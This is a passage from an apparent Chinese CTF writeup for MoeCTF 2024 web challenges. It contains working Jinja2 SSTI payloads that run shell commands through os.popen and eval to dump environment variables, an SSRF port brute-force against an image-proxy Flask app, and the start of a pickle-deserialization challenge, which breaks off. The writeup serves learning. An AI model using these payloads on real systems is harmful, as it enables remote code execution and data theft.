&#125;&#125;”内的内容会被当做表达式，渲染之后在html直接显示结果</span><br></pre></td></tr></table></figure><p>测试发现网站的确存在ssti</p><p><img src="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/whosblog1.png" alt="whosblog1"></p><p>这里无法直接放入python代码，只能放入变量之类的</p><p>常规的思路是用一个空的可迭代数据，如空字符串，列表等通过python的继承机制以其所属的类访问基类Object，再访问其所有子类，找到一个可以执行代码的类，初始化+全局化，然后用这个类的方法实现rce</p><p>这里是访问到了子类的catch_warnings初始化+全局化后用内建函数rce</p><p>具体来说是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">() -空tuple</span><br><span class="line">().__class__ - tuple class</span><br><span class="line">().__class__.__base__ - object类(所有类的最终基类是object)</span><br><span class="line">().__class__.__base__.__subclasses__() ) __subclasses__方法返回它调用的类的所有直接子类的list；对于object，这意味着没有其他显式父类的所有类。</span><br></pre></td></tr></table></figure><p>最后的payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#123;&#123;().__class__.__base__.__subclasses__()[239].__init__.__globals__[%27__builtins__%27][%27__imp%27+%27ort__%27](%27os%27).__dict__[%27pop%27+%27en%27](%27printenv%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>moectf{d0-Y0U_KNOw_5sTi-anD_pIEA5e_v15it_5XRhhH5_BLoG7}</strong> </p><p>当然，还有一种更通用的办法，不要自己一个个看，可以直接找到需要的子类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">    &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">      &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">     &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">       &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">   &#123;% endfor %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解释如下：（from gpt）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">这段 Jinja2 模板代码通过复杂的手段访问 Python 的内部机制，并执行某些操作。我们将逐行解析这段代码，以便理解它的目的和机制。</span><br><span class="line">代码分解</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.[] 是一个空列表。</span><br><span class="line">2.[].__class__ 返回 list 类。</span><br><span class="line">3.list.__base__ 返回 list 的基类，通常是 object。</span><br><span class="line">4.object.__subclasses__() 返回所有 object 的子类。</span><br><span class="line">5.这个 for 循环遍历所有子类。</span><br><span class="line"></span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6.检查当前遍历的子类的名称是否为 &#x27;catch_warnings&#x27;。catch_warnings 是 Python 的 warnings 模块中的一个上下文管理器，专门用于捕获警告。</span><br><span class="line"></span><br><span class="line">&#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7.如果当前类是 catch_warnings，则遍历其 __init__ 方法的全局变量。这些全局变量包含当前作用域中的所有可用变量。</span><br><span class="line"></span><br><span class="line">&#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8.检查当前全局变量 b 是否是一个字典。这是通过比较 b.__class__ 和一个空字典的类来实现的。</span><br><span class="line"></span><br><span class="line">&#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9.如果 b 是一个字典，检查字典中是否存在 &#x27;eval&#x27; 键。eval 是一个 Python 内置函数，用于执行字符串形式的 Python 代码。</span><br><span class="line"></span><br><span class="line">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">10.如果找到了 &#x27;eval&#x27; 键，调用 b[&#x27;eval&#x27;] 方法，执行 __import__(&quot;os&quot;).popen(&quot;id&quot;).read()。</span><br><span class="line">11.这里，__import__(&quot;os&quot;) 导入 os 模块，然后使用 os.popen(&quot;id&quot;) 打开一个进程来执行 id 命令，最后通过 .read() 方法读取其输出。</span><br><span class="line"></span><br><span class="line">整体分析</span><br><span class="line">这段代码的整体目的是在 Jinja2 模板中利用 Python 的内部机制来执行命令。具体过程如下：</span><br><span class="line"></span><br><span class="line">12.遍历所有的对象子类。</span><br><span class="line">13.找到 catch_warnings 类。</span><br><span class="line">14.访问该类的 __init__ 方法的全局变量。</span><br><span class="line">15.检查这些全局变量中是否有 eval 函数。</span><br><span class="line">16.如果有，使用 eval 函数来执行一个系统命令 id，并读取其输出。</span><br><span class="line"></span><br><span class="line">安全警告</span><br><span class="line">这种做法具有极大的安全风险，尤其是在没有正确的输入验证和安全措施的环境中。这可能导致代码注入或远程代码执行漏洞，允许攻击者执行任意命令或访问系统资源。</span><br><span class="line">总结</span><br><span class="line">这段 Jinja2 代码通过复杂的手段访问 Python 的内置机制，尝试执行系统命令。这种代码通常被视为不安全的做法，且不推荐在生产环境中使用。应谨慎使用任何可能导致执行用户输入的代码。</span><br></pre></td></tr></table></figure><p>这个payload也是可行的</p><h2 id="ImageCloud"><a href="#ImageCloud" class="headerlink" title="ImageCloud"></a><strong>ImageCloud</strong></h2><p>源代码中有两个后端代码：</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, abort, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;static/&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">uploaded_files = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;图片上传&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;/upload&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;已上传的图片&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">        <span class="string">f&#x27;&lt;li&gt;&lt;a href=&quot;/image?url=http://localhost:5000/static/<span class="subst">&#123;filename&#125;</span>&quot;&gt;<span class="subst">&#123;filename&#125;</span>&lt;/a&gt;&lt;/li&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> uploaded_files</span><br><span class="line">    ) + <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;未找到文件部分&#x27;</span>, <span class="number">400</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;未选择文件&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        ext = filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower()</span><br><span class="line"></span><br><span class="line">        unique_filename = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(uploaded_files)&#125;</span>_<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">        filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], unique_filename)</span><br><span class="line"></span><br><span class="line">        file.save(filepath)</span><br><span class="line">        uploaded_files.append(unique_filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;文件类型不支持&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/image&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_image</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;URL 参数缺失&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        img = Image.<span class="built_in">open</span>(BytesIO(response.content))</span><br><span class="line"></span><br><span class="line">        img_io = BytesIO()</span><br><span class="line">        img.save(img_io, img.<span class="built_in">format</span>)</span><br><span class="line">        img_io.seek(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> send_file(img_io, mimetype=img.get_format_mimetype())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;无法加载图片: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):</span><br><span class="line">        os.makedirs(UPLOAD_FOLDER)</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>app2.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, abort, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;uploads/&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">uploaded_files = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mimetype</span>(<span class="params">file_path</span>):</span><br><span class="line">    mime = mimetypes.guess_type(file_path)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> mime <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> Image.<span class="built_in">open</span>(file_path) <span class="keyword">as</span> img:</span><br><span class="line">                mime = img.get_format_mimetype()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            mime = <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> mime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_free_port_in_range</span>(<span class="params">start_port, end_port</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        port = random.randint(start_port, end_port)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, port))</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">return</span> port </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;图片上传&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;/upload&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;已上传的图片&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;&lt;li&gt;&lt;a href=&quot;/image/<span class="subst">&#123;filename&#125;</span>&quot;&gt;<span class="subst">&#123;filename&#125;</span>&lt;/a&gt;&lt;/li&gt;&#x27;</span> <span class="keyword">for</span> filename <span class="keyword">in</span> uploaded_files) + <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;未找到文件部分&#x27;</span>, <span class="number">400</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;未选择文件&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line"></span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        ext = filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower()</span><br><span class="line"></span><br><span class="line">        unique_filename = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(uploaded_files)&#125;</span>_<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">        filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], unique_filename)</span><br><span class="line"></span><br><span class="line">        file.save(filepath)</span><br><span class="line">        uploaded_files.append(unique_filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;文件类型不支持&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/image/&lt;filename&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_image</span>(<span class="params">filename</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        mime = get_mimetype(filepath)</span><br><span class="line">        <span class="keyword">return</span> send_file(filepath, mimetype=mime)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;文件未找到&#x27;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):</span><br><span class="line">        os.makedirs(UPLOAD_FOLDER)</span><br><span class="line">    port = find_free_port_in_range(<span class="number">5001</span>, <span class="number">6000</span>)</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=port)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>已知flag.jpg在uploads文件夹之下，uploads和static是在同一级，但是试过无法路径遍历到uploads之下；</p><p>想其他办法；</p><p>当进入页面上传图片并加载上传图片的时候</p><p>url为<a href="http://ip:port/image?url=http://localhost:5000/static/0_hacker.png">http://ip:port/image?url=http://localhost:5000/static/0_hacker.png</a></p><p>这里可以利用一下，利用它跳转到app2.py，就可以用其load_image函数读到flag，关键是怎么跳转？</p><p>路由和其他什么的都有，只差端口了，那就爆破一下吧，告诉了范围是5001到6000</p><p><img src="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/ImageCloud1.png" alt="ImageCloud1"></p><p>看看返回数据长度不一样的包的payload就是</p><p><img src="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/ImageCloud2.png" alt="ImageCloud2"></p><h2 id="Pet-Store"><a href="#Pet-Store" class="headerlink" title="Pet Store"></a><strong>Pet Store</strong></h2><p>这题给的hint是pickle反序列化漏洞，看看源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template, redirect</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pet</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, species</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.species = species</span><br><span class="line">        <span class="variable language_">self</span>.uuid = uuid.uuid4()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Pet(name=<span class="subst">&#123;self.name&#125;</span>, 